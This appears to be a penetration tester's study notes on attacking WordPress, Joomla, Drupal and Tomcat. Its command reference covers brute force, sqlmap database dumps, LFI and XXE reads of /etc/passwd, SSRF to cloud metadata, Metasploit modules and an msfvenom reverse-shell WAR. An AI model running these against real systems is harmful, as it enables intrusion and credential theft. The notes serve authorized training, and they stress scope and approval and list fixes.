# Attacking Common Applications

> Status: 🟨 In progress
> Date started: 2026-10-26
> Date finished: 

## 1. Goal
Enumerate and attack common off-the-shelf applications (CMSs, dev tools, etc.). Starting with WordPress.

## WordPress — discovery & enumeration (reference)
Target placeholder: `<URL>` (module example used `blog.inlanefreight.local`).

### Identify WordPress
```bash
curl -s <URL>/robots.txt                      # disallowed paths often reveal wp-admin/wp-content
curl -s <URL>/wp-admin/                        # redirect behaviour
curl -s <URL>/wp-content/plugins/              # plugin dir
curl -s <URL>/wp-content/themes/               # theme dir
```

### Version & theme
```bash
curl -s <URL> | grep -i "wordpress"            # meta generator / version hints
curl -s <URL>/wp-content/themes/<theme>/style.css
curl -s <URL>/wp-content/themes/<theme>/readme.txt
```

### Plugins (look for known-vuln versions)
```bash
curl -s <URL> | grep -i "plugins"
curl -s <URL>/wp-content/plugins/<plugin>/readme.txt   # version info
```

### User enumeration (manual)
Compare login responses for valid vs invalid users:
```bash
curl -s -I <URL>/wp-login.php -d "log=admin&pwd=invalid"
curl -s -I <URL>/wp-login.php -d "log=invalid&pwd=invalid"
```

### WPScan (automated)
```bash
sudo gem install wpscan
sudo wpscan --url <URL> --enumerate --api-token <TOKEN>
sudo wpscan --url <URL> --enumerate u,p,t      # users, plugins, themes
sudo wpscan --url <URL> --proxy 127.0.0.1:8080 # route through Burp
# brute force — in-scope + approved only:
sudo wpscan --url <URL> --passwords /usr/share/wordlists/rockyou.txt --usernames admin,john
```

### XML-RPC
```bash
curl -i <URL>/xmlrpc.php
curl -X POST -d '<methodCall><methodName>system.listMethods</methodName></methodCall>' <URL>/xmlrpc.php
```
`system.multicall` can amplify brute-force; disabling/limiting xmlrpc.php is the fix.

### Extra checks
```bash
curl -s <URL>/robots.txt | grep Disallow
curl -s <URL>/wp-config.php                     # should NOT be readable
curl -s <URL> | grep -Eo "(http|https)://[a-zA-Z0-9./?=_%:-]*"   # endpoints/keys in source
curl -s <URL>/wp-content/uploads/               # open directory listing?
```

> Brute-force and credential attacks are intrusive — scope + approval only. `wp-config.php` being readable = critical finding (DB creds).

## WordPress — attacking (reference)
Target placeholder `<URL>`, attacker IP `<LHOST>`. All of this is intrusive — authenticated/exploitation actions need scope + approval.

### Authenticated code exec via theme editor
With admin access, an editable theme PHP file (e.g. `404.php`) can be made to run commands — classic admin-to-RCE path. Fix: disable the file editor (`DISALLOW_FILE_EDIT`).
```bash
curl "<URL>/wp-content/themes/<theme>/404.php?0=id"   # after injecting a cmd param into the file
```

### Metasploit admin shell upload (needs valid admin creds)
```text
use exploit/unix/webapp/wp_admin_shell_upload
set RHOSTS <IP>        # set VHOST <URL> if vhost-based
set USERNAME <user>    # set PASSWORD <pass>
set LHOST <LHOST>
run
```

### Known plugin vulns (version-dependent)
```bash
# mail-masta LFI
curl -s "<URL>/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd"
# wpDiscuz unauthenticated RCE (CVE-2020-24186) — public PoC uploads a shell, then:
curl -s "<URL>/wp-content/uploads/<year>/<month>/<uploaded>.php?cmd=id"
```
Always map plugin + version from enum, then check Exploit-DB / searchsploit for a matching PoC.

### User enumeration via REST API
```bash
curl -s <URL>/wp-json/wp/v2/users      # often leaks usernames even when login is hardened
```

### XML-RPC brute force
`system.multicall` lets many credential guesses ride in one request, amplifying brute force. Public scripts automate it against `xmlrpc.php`. Fix: disable or restrict xmlrpc.php.

### wp-config.php exposure
```bash
curl -s <URL>/wp-config.php            # readable = DB creds exposed = critical
```

### Web shell obfuscation (concept, for recognition & reporting)
Attackers rarely drop a plaintext shell. A common pattern wraps the payload in `base64_decode()` fed to `eval()`, so the file looks like a harmless blob but decodes at runtime to a command-executing one-liner. Why it matters for me:
- **Detecting it:** grep uploaded/content dirs for `eval(`, `base64_decode(`, `assert(`, `system(`, `gzinflate(` in `.php` files; flag recently modified files in `wp-content/uploads/`.
- **Reporting it:** note the obfuscation as an IOC and recommend file-integrity monitoring + blocking PHP execution in upload dirs.
I don't store working shell payloads in this repo.

## Joomla — discovery, enum & attacking (reference)
Target placeholder `<URL>`.

### Identify Joomla
```bash
curl -s <URL>/ | grep -i joomla
curl -s <URL>/robots.txt
curl -s <URL>/README.txt                                       # version
curl -s <URL>/administrator/manifests/files/joomla.xml         # detailed version
curl -s <URL>/plugins/system/cache/cache.xml                   # approx version
curl -I <URL>/favicon.ico                                      # default favicon
```
Fingerprint from several sources (README + joomla.xml + cache.xml) for an accurate version — it drives which exploits apply.

### Version via headers / changelog
```bash
curl -I <URL>/ | grep "X-Content-Encoded-By"
curl -s <URL>/CHANGELOG.php
```

### Automated scanners
```bash
droopescan scan joomla --url <URL>/
python2.7 joomlascan.py -u <URL>/
```

### Login brute force (scope + approval only)
```bash
python3 joomla-brute.py -u <URL> -w <wordlist> -usr admin
```

### Extension enumeration (common vuln source)
```bash
curl -s <URL>/components/
curl -s <URL>/modules/
curl -s <URL>/plugins/
curl -s <URL>/templates/
curl -s <URL>/media/
```

### Config / backup exposure
```bash
curl -s <URL>/configuration.php        # sensitive: DB creds; also .bak
curl -s <URL>/configuration.php.bak
curl -s <URL>/backup.zip
curl -s <URL>/joomla.sql
```

### REST API / user enum
```bash
curl -s <URL>/api/index.php/v1/users
curl -X POST -d "username=admin" "<URL>/index.php?option=com_users&view=reset"
```

### Directory / file discovery
```bash
dirb <URL> /usr/share/wordlists/dirb/common.txt
```

### Known CVEs
```bash
# SQLi CVE-2017-8917
sqlmap -u "<URL>/index.php?option=com_content&id=1" --dbs --batch
# CVE-2023-23752 — unauth info disclosure (leaks config incl. DB creds)
curl -X GET "<URL>/api/index.php/v1/config/application?public=true"
```

### Log checks
```bash
curl -s <URL>/logs/error.php
curl -s <URL>/logs/debug.log
```

> `configuration.php` exposure and CVE-2023-23752 both leak DB credentials — critical findings. Brute-force and SQLi are intrusive: scope + approval only.

## Joomla — attacking (reference)
Intrusive — scope + approval. Target `<URL>`, attacker `<LHOST>`.

### Authenticated template RCE
Log in to `/administrator`, edit a template PHP file (e.g. `error.php`) to run commands via a non-standard param, then clean up.
```bash
curl -s "<URL>/templates/<template>/error.php?<rand>=id"
```
Fix: lock down template editing, restrict admin panel access.

### CVE-2019-10945 — core directory traversal + file deletion
```bash
python2.7 joomla_dir_trav.py --url "<URL>/administrator/" --username admin --password admin --dir /
```
Can read/list sensitive files like `configuration.php`.

### Config exposure
```bash
curl -s <URL>/configuration.php        # DB creds if readable
```

### Extension exploitation
Enumerate extensions → research the specific version → craft the exploit against the component path. Extensions are the most common Joomla attack vector.

### Metasploit
```text
search joomla
use exploit/unix/webapp/joomla_<module>
set RHOSTS <IP> ; set TARGETURI /administrator/
set USERNAME admin ; set PASSWORD <pass>
set LHOST <LHOST> ; run
```

### SQLi → DB dump (sqlmap workflow)
```bash
sqlmap -u "<URL>/index.php?id=1" --dbs --batch
sqlmap -u "<URL>/index.php?id=1" -D <db> --tables --batch
sqlmap -u "<URL>/index.php?id=1" -D <db> -T <table> --columns --batch
sqlmap -u "<URL>/index.php?id=1" -D <db> -T <table> -C <cols> --dump --batch
```

### REST API / XSS / CLI
```bash
curl -s <URL>/api/index.php/v1/users                      # enum/modify if enabled
curl "<URL>/index.php?param=<script>alert(1)</script>"    # reflected XSS test
joomla user:list                                          # if shell access
```

### Post-exploitation
Generic, not Joomla-specific — see the dedicated modules:
- Privesc enum: `linpeas.sh` (Linux, module 25) / `winpeas.exe` (Windows, module 26)
- Pivoting (chisel, sshuttle): module 12 → `cheatsheets/pivoting.md`

### Web shells
Obfuscated shell generation/detection is covered once in the WordPress section above (I don't store working payloads). Same technique applies here.

## Drupal — discovery & enumeration (reference)
Target `<URL>`. Drupal structure: `/modules/`, `/themes/`, `/sites/`, node-based URLs (`/node/1`).

### Identify & version
```bash
curl -s <URL> | grep -i drupal                         # HTML metadata
curl -s <URL>/robots.txt                               # disallows + node refs
curl -s <URL>/CHANGELOG.txt                            # version (often blocked)
curl -s <URL>/rss.xml | grep generator                # generator metadata
curl -s <URL>/core/assets/vendor/jquery/jquery.min.js | grep -i drupal
droopescan scan drupal -u <URL>                        # automated version + modules/themes
# if DB access gained:  SELECT version FROM system;
```

### Modules & themes (find exact versions in .info.yml)
```bash
curl -s <URL>/modules/
curl -s <URL>/modules/<module>/<file>.info.yml
curl -s <URL>/themes/
curl -s <URL>/themes/<theme>/<file>.info.yml
```

### Config / backups / debug exposure
```bash
curl -s <URL>/sites/default/settings.php               # DB creds if readable
curl -s <URL>/sites/default/files/backup.sql           # exposed DB backup
curl -s <URL>/phpinfo.php                               # debug left enabled
```

### Users / content / APIs
```bash
curl -s <URL>/?q=user                                  # public profiles
curl -s <URL>/user/1                                   # default admin enum
curl -s <URL>/rest/user/login_status?_format=json      # REST API if enabled
curl -s <URL>/node/2                                   # sequential node IDs
curl -s <URL>/node.json                                # JSON API enabled?
curl -X POST <URL>/graphql -H "Content-Type: application/json" --data '{"query":"{__schema{types{name}}}"}'   # GraphQL schema
```

### Admin panel
```bash
curl -s <URL>/user/login
curl -s <URL>/admin
```

> `settings.php` and exposed `backup.sql` leak DB creds — critical. Known Drupal RCEs (e.g. Drupalgeddon2 CVE-2018-7600) depend on exact core version, so fingerprint first.

## Drupal — attacking (reference)
Intrusive — scope + approval. Fingerprint the exact core version first; Drupalgeddon variants are version-specific.

### PHP filter module (Drupal < 8)
With admin, enable the core PHP filter module and inject PHP into content for RCE. Needs client comms before enabling modules. Fix: PHP filter removed in Drupal 8+.

### Backdoored module upload
With admin, a malicious module (e.g. a trojanized `captcha` package) can be uploaded for RCE. I don't store the shell payload — see the web-shell detection note in the WordPress section. Note: never modify production without explicit permission.

### Drupalgeddon family (the big ones)
```text
# Drupalgeddon  CVE-2014-3704  — SQLi, creates an admin user (Drupal 7 core)
python2.7 drupalgeddon.py -t <URL> -u <user> -p <pass>

# Drupalgeddon2 CVE-2018-7600  — unauth RCE via user registration form
python3 drupalgeddon2.py         # public PoC; drops a shell (payload not stored here)

# Drupalgeddon3 CVE-2018-7602  — authenticated RCE via Form API (needs a valid session)
msf6> use exploit/multi/http/drupal_drupageddon3
msf6> set RHOSTS <IP>; set VHOST <URL>; set DRUPAL_SESSION <sess>; set DRUPAL_NODE 1; set LHOST <LHOST>; run
```

### Config exposure
```bash
curl -s <URL>/sites/default/settings.php     # DB creds if readable
```

### SQL injection → dump (sqlmap)
```bash
sqlmap -u "<URL>/node/1?id=1" --dbs --batch
sqlmap -u "<URL>/node/1?id=1" -D <db> --tables --batch
sqlmap -u "<URL>/node/1?id=1" -D <db> -T <table> -C <cols> --dump --batch
sqlmap -u "<URL>/node/1?id=1" --level 5 --risk 3        # deeper, noisier
```

### Other web attack surface (primary homes in web modules 17/21/23)
```bash
# File upload (module 21) — test extensions, check MIME enforcement
curl -F "file=@test.php" <URL>/<upload_path>
# XXE (module 23) — read local files
curl -X POST -H "Content-Type: application/xml"   -d '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>' <URL>/<xml_endpoint>
# SSRF (module 23) — hit cloud metadata
curl "<URL>/page?url=http://169.254.169.254/latest/meta-data/"
# Access control — admin reachable unauthenticated?
curl -I <URL>/admin
```

### Brute force (scope + approval only)
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt <HOST>   http-post-form "/user/login:name=^USER^&pass=^PASS^&form_id=user_login:Invalid username or password"
```

> XXE/SSRF/file-upload are general web attacks — primary notes build in modules 21 (upload) and 23 (web attacks); kept here as the Drupal-context quick reference.

## Apache Tomcat — discovery, enum & attacking (reference)
Target `<HOST>:<PORT>`.

### Version detection
```bash
curl -I http://<HOST>:<PORT>/ | grep -i Server       # server header
curl -s http://<HOST>:<PORT>/docs/ | grep -i "Apache Tomcat"
curl -s http://<HOST>:<PORT>/nonexistentpage          # error pages may leak version
```

### Key files / directory structure
- `/conf/tomcat-users.xml` — **user creds + roles (plaintext)**
- `/conf/web.xml`, `/webapps/<app>/WEB-INF/web.xml` — routes/servlets
- `/conf/server.xml`, `context.xml`, `catalina.properties` — ports, config, creds
- `/webapps/` — deployed apps · `/bin` — scripts

### Manager app enumeration
```bash
gobuster dir -u http://<HOST>:<PORT>/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
# look for /manager and /host-manager
```
Default creds to try: `tomcat:tomcat`, `admin:admin`, `tomcat:password`, `role1:role1`.
```bash
hydra -l tomcat -P /usr/share/wordlists/rockyou.txt <HOST> http-get /manager/html   # scope+approval
```

### WAR upload RCE (after /manager access)
The classic Tomcat RCE: deploy a malicious WAR via the Manager. Standard payload generation:
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> -f war > shell.war
# deploy via Manager, then trigger the JSP endpoint
```
Fix: remove/restrict Manager, strong creds, don't expose it externally.

### JMX (often 1099)
```bash
java -jar jmxterm.jar --url service:jmx:rmi:///jndi/rmi://<HOST>:<PORT>/jmxrmi   # explore MBeans
# metasploit: use exploit/multi/misc/java_jmx_server ; set RHOST/RPORT ; run
```

### AJP connector (8009) — Ghostcat CVE-2020-1938
```bash
nmap -p8009 --script ajp-headers <HOST>
python3 ghostcat.py -u <HOST>:8009        # file disclosure / potential RCE
```

### Web app enum & CVEs
```bash
gobuster dir -u http://<HOST>:<PORT>/ -w <wordlist>           # find apps/JSPs
wfuzz -c -z file,<ext_list> --hc 404 http://<HOST>:<PORT>/FUZZ.jsp
searchsploit tomcat <version>
```

> `tomcat-users.xml` with plaintext creds and an exposed `/manager` = the standard Tomcat compromise path. WAR-upload and JMX are intrusive; Ghostcat needs AJP exposed.

### Tomcat — attacking: CVEs & modules (reference)
All intrusive, scope + approval. Fingerprint version first.

**Manager brute force**
```text
msf6> use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS <IP>; set RPORT <PORT>; set STOP_ON_SUCCESS true
set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/tomcat_mgr_default_userpass.txt
run
```

**WAR upload RCE (after /manager login)** — generate WAR with msfvenom (see Tomcat section above), deploy via Manager, trigger the endpoint. Don't fetch prebuilt webshells into the repo.
```text
msf6> use exploit/multi/http/tomcat_mgr_upload
set RHOSTS <IP>; set USERNAME <u>; set PASSWORD <p>; run
```

**Version-specific CVEs**
| CVE | What it is | Exploited with |
|---|---|---|
| CVE-2020-1938 (Ghostcat) | AJP file read / potential RCE | `nmap -p8009 --script ajp-headers`, public ghostcat PoC (`-f WEB-INF/web.xml`) |
| CVE-2009-3548 | Manager deploy bypass (default creds / unauth) | `curl -T shell.war "http://<IP>:8080/manager/deploy?path=/x"` |
| CVE-2017-12617 | Arbitrary JSP upload via HTTP PUT (when PUT enabled) | PUT a JSP to the webroot — payload not stored here; see web-shell detection note |
| CVE-2020-9484 | Java deserialization RCE via persistent sessions | `ysoserial` gadget (e.g. CommonsCollections) POSTed as a serialized object — gadget/command not stored here |
| CVE-2016-8735 | JMX RMI RCE | `use exploit/multi/misc/java_jmx_server` (RPORT 1099) |

**Connectors:** AJP can expose internal resources; HTTP connector misconfigs can allow auth bypass.

> The default-creds → `/manager` → WAR-upload path is still the most common real-world Tomcat compromise. The CVEs matter when creds fail or Manager isn't reachable.

### My notes / lab output
Filled in once I run this on a target.

## 2. Setup
- Attack box: (Pwnbox / Kali VM)
- Target(s): `<TARGET_IP>` (placeholders only, no real lab IPs)

## 3. Commands I used
Each block says which machine it ran on.

```bash
# [ATTACK BOX]

```

```bash
# [TARGET]

```

## 4. Confirmed (what worked)
- 

## 5. Tried, didn't work (and why)
- 

## 6. Open questions / revisit
- 

## 7. Cheat sheet lines
Copied into `cheatsheets/`:
- 
